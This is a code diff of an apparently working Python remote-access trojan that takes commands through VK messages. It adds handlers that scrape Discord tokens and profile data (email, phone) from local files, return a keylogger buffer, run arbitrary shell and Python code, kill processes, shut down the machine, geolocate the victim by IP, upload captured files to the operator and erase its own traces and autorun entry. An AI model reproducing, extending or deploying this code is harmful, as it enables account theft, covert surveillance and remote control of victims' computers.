+def command_properties(arguments, _) -> CommandResult:
+    """ Command `properties` that returns properties of the file. """
+
+    # Get download path.
+    path = arguments.replace("\"", "").replace("\'", "")
+
+    if os.path.exists(path):
+        # If path exists.
+
+        # Getting size.
+        property_size = f"{filesystem_get_size(path)}MB"
+
+        # Getting type.
+        property_type = filesystem_get_type(path)
+
+        # Getting time properties.
+        property_created_at = datetime.date.fromtimestamp(os.path.getctime(path))
+        property_accessed_at = datetime.date.fromtimestamp(os.path.getatime(path))
+        property_modified_at = datetime.date.fromtimestamp(os.path.getmtime(path))
+
+        # Returning properties.
+        return CommandResult(
+            f"Path: {path},\n"
+            f"Size: {property_size},\n"
+            f"Type: {property_type},\n"
+            f"Modified: {property_modified_at},\n"
+            f"Created: {property_created_at},\n"
+            f"Accessed: {property_accessed_at}."
+        )
+    else:
+        # If not exists.
+
+        if os.path.exists(folder + path):
+            # Try relative.
+
+            # Call for relative.
+            return command_properties(folder + path, _)
+
+    # Error.
+    return CommandResult("Path does not exists!")
+
+
+def command_cd(arguments, _) -> CommandResult:
+    """ Command `cd` that changes directory. """
+
+    # Globalising current directory.
+    global current_directory
+
+    # Get directory path.
+    path = arguments
+
+    # Remove trailing slash.
+    if path.endswith("\\"):
+        path = path[:-1]
+
+    if path.startswith(".."):
+        # If go up.
+
+        # Get directory elements.
+        path_directories = current_directory.split("\\")
+
+        if len(path_directories) == 1:
+            # If last (like C:\\)
+
+            # Error.
+            return CommandResult("Already in root! Directory: " + current_directory)
+
+        # Remove last.
+        path_directories.pop(-1)
+
+        # TODO: Fix root error (С: without trailing slash).
+        if len(path_directories) <= 1:
+            # If last (like C:\\)
+
+            # Valid.
+            path_directories.append("")
+
+        # Pass path to next cd command.
+        path = "\\".join(path_directories)
+        return command_cd(path, _)
+
+    if os.path.exists(current_directory + "\\" + path):
+        # If this is local folder.
+
+        if not os.path.isdir(current_directory + "\\" + path):
+            # If not directory.
+
+            # Error.
+            return CommandResult("Can`t change directory to the filename")
+
+        # Changing.
+        current_directory += "\\" + path
+
+        # Message.
+        return CommandResult(f"Changed directory to {current_directory}")
+    else:
+        # If not local path.
+        if os.path.exists(path):
+            # If path exists - moving there.
+
+            if not os.path.isdir(path):
+                # If not directory.
+
+                # Error.
+                return CommandResult("Can`t change directory to the filename")
+
+            if path == "":
+                # If no arguments.
+
+                # Message.
+                return CommandResult(f"Current directory - {current_directory}")
+
+            # Changing.
+            current_directory = path
+
+            # Message.
+            return CommandResult(f"Changed directory to {current_directory}")
+
+        # Message.
+        return CommandResult(f"Directory {path} does not exists!")
+
+
+def command_location(*_) -> CommandResult:
+    """ Command `location` that returns location based on IP. """
+
+    # Getting ip data.
+    ip_data = get_ip()
+
+    if all(key in ip_data for key in ("ip", "city", "country", "region", "org")):
+        # If all required fields exists.
+
+        # Getting ip data.
+        address = ip_data["ip"]
+        city = ip_data["city"]
+        country = ip_data["country"]
+        region = ip_data["region"]
+        provider = ip_data["org"]
+
+        # Returning.
+        return CommandResult(
+            f"IP: {address},\n"
+            f"Country: {country},\n"
+            f"Region: {region},\n"
+            f"City: {city},\n"
+            f"Provider: {provider}."
+        )
+
+    # Error.
+    return CommandResult("Couldn't get location from IP data")
+
+
+def command_name_new(arguments, _) -> CommandResult:
+    """ Сommand `name_new` that changes name to other."""
+
+    # Global name.
+    global client_name
+
+    if len(arguments) > 0:
+        # If correct arguments.
+
+        # Changing name.
+        client_name = arguments
+
+        # Saving name
+        save_name()
+
+        # Returning.
+        return CommandResult(f"Name was changed to {client_name}")
+
+    # Returning.
+    return CommandResult("Invalid new name!")
+
+
+def command_discord_profile_raw(*_) -> CommandResult:
+    """ Сommand "discord_profile_raw" that returns information about discord found in system (as raw dict). """
+
+    # Grab tokens.
+    tokens = stealer_steal_discord_tokens()
+
+    if len(tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return CommandResult("Discord tokens not found in system!")
+
+    # Get profile.
+    profile = stealer_steal_discord_profile(tokens)
+
+    # Returning.
+    if profile:
+        return CommandResult(json.dumps(profile, indent=2))
+
+    # Error.
+    return CommandResult("Discord profile not found (Failed to load)")
+
+
+def command_ddos(arguments, _) -> CommandResult:
+    """ Command `ddos` that start ddos. """
+
+    # Getting arguments.
+    arguments = arguments.split(";")
+
+    if len(arguments) >= 1:
+        # If arguments OK.
+
+        # Get address.
+        address = arguments[0]
+
+        if len(arguments) > 2 and arguments[2] == "admin":
+            # If admin.
+
+            # Get timeout.
+            timeout = arguments[1]
+
+            # Pinging from admin.
+            # TODO. Disable console output.
+            console_response = os.system(f"ping -c {address} {timeout}")
+
+            if console_response == SYSTEM_OK_STATUS_CODE:
+                # Message.
+                return CommandResult("Completed DDoS (Admin)")
+
+            # Error.
+            return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")
+
+        # Pinging from user.
+        # TODO. Disable console output.
+        console_response = os.system(f"ping {address}")
+
+        if console_response == SYSTEM_OK_STATUS_CODE:
+            # Message.
+            return CommandResult("Completed DDoS (User)")
+
+        # Error.
+        return CommandResult(f"DDoS ping returned non-zero status {console_response}! (User)")
+
+    # Message.
+    return CommandResult("DDoS incorrect arguments! Example: address;time;admin or address")
+
+
+def command_ls(arguments, _) -> CommandResult:
+    """ Command `ls` that lists all files in the directory. """
+
+    # Get directory.
+    directory_path = arguments if arguments != "" else current_directory
+
+    # Get files.
+    # TODO filesystem_try_listdir error handling.
+    directory_list = filesystem_try_listdir(directory_path)
+    directory_items = ",\n".join([
+        ("[D] " + path if os.path.isdir(directory_path + "\\" + path) else "[F] " + path) for path in directory_list
+    ]) if directory_list else "Empty (Or error)!"
+
+    # Returning.
+    return CommandResult(f"Directory `{directory_path}`:\n" + directory_items)
+
+
+def command_link(arguments, _) -> CommandResult:
+    """ Command `link` that opens link."""
+
+    # Get arguments.
+    arguments = arguments.split(";")
+
+    native = False
+
+    if len(arguments) > 1 and arguments[1] == "native":
+        # If not native.
+        native = True
+
+    if not native:
+        # If not native mode .
+
+        try:
+            # Trying to open with the module.
+
+            # Importing module.
+            import webbrowser  # noqa
+
+            # Opening link.
+            webbrowser.open(arguments[0])
+
+            # Message.
+            return CommandResult("Link was opened (Via module)!")
+        except ImportError:
+            # If there is ImportError.
+            pass
+
+    # Opening with system.
+    # TODO: Linux=open, Windows=start
+    # TODO. Disable console output.
+    console_response = os.system(f"start {arguments[0]}")
+
+    if console_response == SYSTEM_OK_STATUS_CODE:
+        # If OK.
+
+        # Message.
+        return CommandResult(f"Link was opened (Via system, native)!")
+
+    # Error..
+    return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")
+
+
+def command_drives(*_) -> CommandResult:
+    """ Command `drives` that returns list of all drives in the system. """
+
+    # Returning.
+    return CommandResult("Drives: \n" + "Drive: ,\n".join(filesystem_get_drives_list()))
+
+
+def command_discord_tokens(*_) -> CommandResult:
+    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """
+
+    # Getting tokens.
+    tokens = stealer_steal_discord_tokens()
+
+    if len(tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return CommandResult("Discord tokens was not found in system!")
+
+    # Returning.
+    return CommandResult("Discord tokens:\n" + ",\n".join(tokens))
+
+
+def command_taskkill(arguments, _) -> CommandResult:
+    """ Command `taskkill` that kills task. """
+
+    # Call console.
+    # TODO. Disable console output.
+    console_response = os.system(f"taskkill /F /IM {arguments}")
+
+    # Executing system and returning result.
+    if console_response == SYSTEM_OK_STATUS_CODE:
+        # If OK
+
+        # OK Mesasge.
+        return CommandResult(f"Task successfully killed!")
+
+    # Error.
+    return CommandResult(f"Unable to kill task, there is some error? (Non-zero exit code {console_response})")
+
+
+def command_upload(*_) -> CommandResult:
+    """ Command `upload` that uploads file to the client. """
+
+    # Error. TODO.
+    return CommandResult("Not implemented yet!")
+
+
+def command_python(arguments, _) -> CommandResult:
+    """ Command `python` that executes python code. """
+
+    # Executing.
+    return CommandResult(execute_python(arguments, globals(), locals()))
+
+
+def command_tags(*_) -> CommandResult:
+    """ Command tags that returns tags list. """
+
+    # Returning.
+    return CommandResult(str("Tag: ,\n".join(client_tags)))
+
+
+def command_version(*_) -> CommandResult:
+    """ Command `version` that returns version """
+
+    # Returning.
+    return CommandResult(VERSION)
+
+
+def command_discord_profile(*_) -> CommandResult:
     """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""
 
     # Getting tokens.
@@ -1344,7 +1291,7 @@ def command_discord_profile(*_) -> str:
         # If not found any tokens.
 
         # Error.
-        return "Discord tokens not found in system!"
+        return CommandResult("Discord tokens was not found in system!")
 
     # Getting profile.
     profile = stealer_steal_discord_profile(tokens)
@@ -1358,58 +1305,97 @@ def command_discord_profile(*_) -> str:
             avatar = "\n\n" + f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png"
 
         # Returning.
-        return f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + avatar
+        return CommandResult(
+            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + avatar
+        )
     else:
         # If can`t get.
 
         # Error.
-        return "Failed to get Discord profile!"
+        return CommandResult("Failed to get Discord profile!")
 
 
-def command_exit(*_) -> str:
+def command_exit(*_) -> CommandResult:
     """ Command `exit` that exists app. """
 
     # Exiting.
     sys.exit(0)
 
     # Message.
-    return "Exiting..."  # noqa
+    return CommandResult("Exiting...")  # noqa
 
 
-def command_shutdown(*_) -> str:
+def command_shutdown(*_) -> CommandResult:
     """ Command `shutdown` that shutdown system. """
 
     # Shutdown.
+    # TODO. Disable console output.
     os.system("shutdown /s /t 0")
 
     # Message.
-    return "Shutdowning system (`shutdown /s /t 0`)..."
+    return CommandResult("Shutdowning system (`shutdown /s /t 0`)...")
 
 
-def command_alive(*_):
+def command_alive(*_) -> CommandResult:
     """ Command `alive` that show current time. """
 
     # Getting current time.
     current_time = datetime.datetime.now().strftime("%H:%M:%S")
 
     # Message.
-    return f"Alive! Time: {current_time}"
+    return CommandResult(f"Alive! Time: {current_time}")
 
 
-def command_restart(*_) -> str:
+def command_destruct(*_) -> CommandResult:
+    """ Command `destruct` that deletes self from system. """
+
+    # Unregistering from the autorun.
+    autorun_unregister()
+
+    # Removing working folder path.
+    filesystem_try_delete(folder + config["paths"]["tags"])
+    filesystem_try_delete(folder + config["paths"]["name"])
+    filesystem_try_delete(folder + config["paths"]["log"])
+    filesystem_try_delete(folder + config["paths"]["anchor"])
+    filesystem_try_delete(folder + config["paths"]["screenshot"])
+    filesystem_try_delete(folder + config["paths"]["microphone"])
+    filesystem_try_delete(folder + config["paths"]["webcam"])
+    filesystem_try_delete(folder + config["autorun"]["executable"])
+    filesystem_try_delete(folder)
+
+    # Exiting.
+    return command_exit(*_)
+
+
+def command_keylog(*_) -> CommandResult:
+    """ Command `keylog` that shows current keylog buffer."""
+
+    if not FEATURE_KEYLOGGER_ENABLED:
+        # If disabled.
+
+        # Error.
+        return CommandResult("Keylogger is disabled!")
+
+    # Returning.
+    return CommandResult(keylogger_buffer)
+
+
+def command_restart(*_) -> CommandResult:
     """ Command `restart` that restarts system. """
 
     # Restarting.
+    # TODO. Disable console output.
     os.system("shutdown /r /t 0")
 
     # Message.
-    return "Restarting system (`shutdown /r /t 0`)..."
+    return CommandResult("Restarting system (`shutdown /r /t 0`)...")
 
 
-def command_console(arguments, _) -> str:
+def command_console(arguments, _) -> CommandResult:
     """ Command `console` that executing console. """
 
     # Call console.
+    # TODO. Disable console output.
     console_response = os.system(arguments)
 
     # Executing system and returning result.
@@ -1417,15 +1403,15 @@ def command_console(arguments, _) -> str:
         # If OK
         
         # OK Mesasge.
-        return f"Console status code: OK (Returned - {console_response})"
+        return CommandResult(f"Console status code: OK (Exit code {console_response})")
 
     # Error.
-    return f"Console status code: ERROR (Returned - {console_response})"
+    return CommandResult(f"Console status code: ERROR (Non-zero exit code {console_response})")
 
 
 # Client.
 
-def execute_command(command_name: str, arguments: str, event) -> str:
+def execute_command(command_name: str, arguments: str, event) -> CommandResult:
     """ Function that executes command and return it result. """
 
     for command in commands_functions:
@@ -1435,10 +1421,148 @@ def execute_command(command_name: str, arguments: str, event) -> str:
             # If it is this commands.
 
             # Executing command and returning result.
-            return commands_functions[command](arguments, event)
+            result: CommandResult = commands_functions[command](arguments, event)
+            return result
 
     # Default answer.
-    return f"Invalid command {command_name}! Write `help` command to get all commands!"
+    return CommandResult(f"Invalid command {command_name}! Write `help` command to get all commands!")
+
+
+def process_message(event) -> None:
+    """ Processes message from the server. """
+
+    # Get base message.
+    message = event
+
+    # Update message container with type.
+    if config["server"]["type"] == "VK_GROUP":
+        message = message.message
+
+    # Response answer and attachment.
+    answer_text: str = "Void... (No response)"
+    answer_attachment = None
+
+    try:
+        # Trying to answer.
+
+        # Getting arguments from the message text.
+        arguments = message.text.split(";")
+
+        if len(arguments) == 0:
+            # If empty.
+
+            # Returning.
+            return
+
+        # Getting tags.
+        tags = arguments.pop(0)
+
+        if tags == "alive":
+            # If this is network command (That is work without tags and for all).
+
+            if peer_is_allowed(message.peer_id):
+                # If peer is alowed
+
+                # Answering that we in network.
+                answer_text = command_alive("", event).get_text()
+            else:
+                # Answering with an error.
+                answer_text = "Sorry, but you don't have required permissions to call this command!"
+        else:
+            # If this is not alive command.
+
+            if list_intersects(parse_tags(tags), client_tags):
+                # If we have one or more tag from our tags.
+
+                if peer_is_allowed(message.peer_id):
+                    # If peer is allowed.
+
+                    if len(arguments) == 0:
+                        # If there is no command (just tags only).
+
+                        # Responding with error.
+                        answer_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
+                    else:
+                        # If there is no error.
+
+                        # Getting command itself.
+                        command = str(arguments.pop(0)).lower().replace(" ", "")
+
+                        # Getting arguments (Joining all left list indices together).
+                        command_arguments = ";".join(arguments)
+
+                        # Executing command.
+                        command_result: CommandResult = execute_command(command, command_arguments, event)
+
+                        # Get attachment.
+                        command_result_attachment = command_result.get_attachment()
+
+
+                        if command_result_attachment is not None:
+                            # If response is attachment.
+
+                            # Getting values.
+                            uploading_path, uploading_title, uploading_type = command_result_attachment
+
+                            if uploading_type == "photo":
+                                # If this is just photo.
+
+                                # Upload photo.
+                                answer_text = uploading_title
+                                answer_attachment = server_upload_photo(uploading_path)
+                            elif uploading_type in ("doc", "audio_message"):
+                                # If this is document or audio message.
+
+                                # Uploading file on the server.
+                                uploading_status, uploading_result = \
+                                    server_upload_document(uploading_path, uploading_title,
+                                                           message.peer_id, uploading_type)
+
+                                if uploading_status:
+                                    # If uploading file result is OK.
+
+                                    # Setting response.
+                                    answer_text = uploading_title
+                                    answer_attachment = uploading_result
+                                else:
+                                    # If there is an error.
+
+                                    # Setting response.
+                                    answer_text = f"Error when uploading document with type `{uploading_type}`. " \
+                                                  f"Result - {uploading_result}"
+
+                            if config["settings"]["delete_file_after_uploading"] and \
+                                    command_result.should_delete_after_uploading():
+                                # If should delete.
+
+                                # Try delete.
+                                filesystem_try_delete(uploading_path)
+                        else:
+                            # If no attachment response.
+
+                            # Getting text.
+                            answer_text = command_result.get_text()
+                else:
+                    # If not is admin.
+
+                    # Answering with an error.
+                    answer_text = "Sorry, but you don't have required permissions to make this command!"
+            else:
+                # If lists of tags not intersects.
+
+                # Returning.
+                return
+    except Exception as exception:  # noqa
+        # If there an exception.
+
+        # Getting exception answer.
+        answer_text = f"Failed to process message answer. Exception - {exception}"
+
+    if answer_text or answer_attachment:
+        # If response is not blank.
+
+        # Send message back to server.
+        server_message(answer_text, answer_attachment, message.peer_id)
 
 
 # Debug.
@@ -1671,7 +1795,7 @@ def server_listen() -> None:
                         # If this is message event.
 
                         # Processing client-server answer.
-                        client_answer_server(event)
+                        process_message(event)
                     
             except Exception as exception:  # noqa
                 # If there is exception occurred.
@@ -1777,11 +1901,11 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
             # If no.
 
             # Error.
-            return False, upload_server
+            return False, "Upload Server Error" + str(upload_server)
 
         # Posting file on the server.
         request = json.loads(requests.post(upload_url, files={
-            "file": open(path, "rb", encoding="UTF-8")
+            "file": open(path, "rb")
         }).text)
 
         if "file" in request:
@@ -1791,8 +1915,8 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
             request = server_docs_api.save(file=request["file"], title=title, tags=[])
 
             # Get fields.
-            document_id = {request[document_type]["id"]}
-            document_owner_id = {request[document_type]["owner_id"]}
+            document_id = request[document_type]["id"]
+            document_owner_id = request[document_type]["owner_id"]
 
             # Returning document.
             return True, f"doc{document_owner_id}_{document_id}"
@@ -1800,10 +1924,10 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
             # If there is not all fields.
 
             # Debug message.
-            debug_message(f"[Server] Error when uploading document (Request)! Exception - {request}")
+            debug_message(f"[Server] Error when uploading document (Request)! Request - {request}")
 
             # Returning request as error.
-            return False, request
+            return False, "Request Error" + str(request)
     except Exception as exception:  # noqa
         # If there is error.
 
@@ -1811,7 +1935,7 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
         debug_message(f"Error when uploading document (Exception)! Exception: {exception}")
 
         # Returning exception.
-        return False, exception
+        return False, "Exception Error" + str(exception)
 
 
 # File System.
@@ -2003,7 +2127,7 @@ def load_tags() -> None:
                     # With opened file.
 
                     # Reading tags.
-                    client_tags = eval(tags_file.read())
+                    client_tags = json.loads(tags_file.read())["tags"]
             except Exception as exception:  # noqa
                 # If there is exception occurred.
 
@@ -2059,7 +2183,9 @@ def save_tags() -> None:
             # With opened file.
 
             # Writing tags.
-            tags_file.write(str(client_tags))
+            tags_file.write(json.dumps({
+                "tags": client_tags
+            }))
     except Exception as exception:  # noqa
         # If there is exception occurred.
 
@@ -2122,8 +2248,11 @@ def get_hwid() -> str:
         hwid_grab_command = "wmic csproduct get uuid"
 
         # Opening process.
-        process = subprocess.Popen(hwid_grab_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE)
+        with open("NUL", "w", encoding="UTF-8") as void_file:
+            # TODO. When there is DEBUG flag, not write to file.
+            # That file is disables console out.
+            process = subprocess.Popen(hwid_grab_command, shell=True, stdin=void_file, stdout=void_file,
+                                       stderr=void_file)
 
         # Returning HWID.
         return str((process.stdout.read() + process.stderr.read()).decode().split("\n")[1])
@@ -2244,6 +2373,7 @@ def initialise_commands() -> None:
         "tags": command_tags,
         "location": command_location,
         "keylog": command_keylog,
+        "taskkill": command_taskkill,
         "cd": command_cd,
         "ls": command_ls,
         "drives": command_drives,
@@ -2461,23 +2591,21 @@ def stealer_steal_discord_tokens() -> typing.List[str]:
             # For log files in folder.
 
             # Opening file.
-            file = open(f"{token_path}\\{log_file}", errors="ignore", encoding="UTF-8")
+            with open(f"{token_path}\\{log_file}", errors="ignore", encoding="UTF-8") as file:
+                # Opening file.
 
-            for line in [line.strip() for line in file.readlines() if line.strip()]:
-                # Getting all lines.
+                for line in [line.strip() for line in file.readlines() if line.strip()]:
+                    # Getting all lines.
 
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                    # Checking all regexs.
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                        # Checking all regexs.
 
-                    for token in re.findall(regex, line):
-                        # Grabbing token.
+                        for token in re.findall(regex, line):
+                            # Grabbing token.
 
-                        if "mfa." in token:
-                            # Adding token.
-                            tokens.append(token)
-
-            # Dont forgot to close file.
-            file.close()
+                            if "mfa." in token:
+                                # Adding token.
+                                tokens.append(token)
 
     # Returning not-same tokens.
     return list(set(tokens))
@@ -2708,7 +2836,7 @@ def exit_handler() -> None:
     """ Should be registered as exit handler (at_exit). """
 
     # Sever message.
-    server_message(f"Disconnected from the network!")
+    server_message("Disconnected from the network!")
 
     # Debug message.
     debug_message("[Exit Handler] Exit...")
@@ -2770,11 +2898,11 @@ def launch() -> None:
 
         # Starting listening messages.
         server_listen()
-    except Exception as exception:  # noqa
+    except Exception as launch_exception:  # noqa
         # If there is exception occurred.
 
         # Error.
-        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
+        debug_message(f"[Launch] Failed to launch! Exception - {launch_exception}")
         sys.exit(1)
 
 
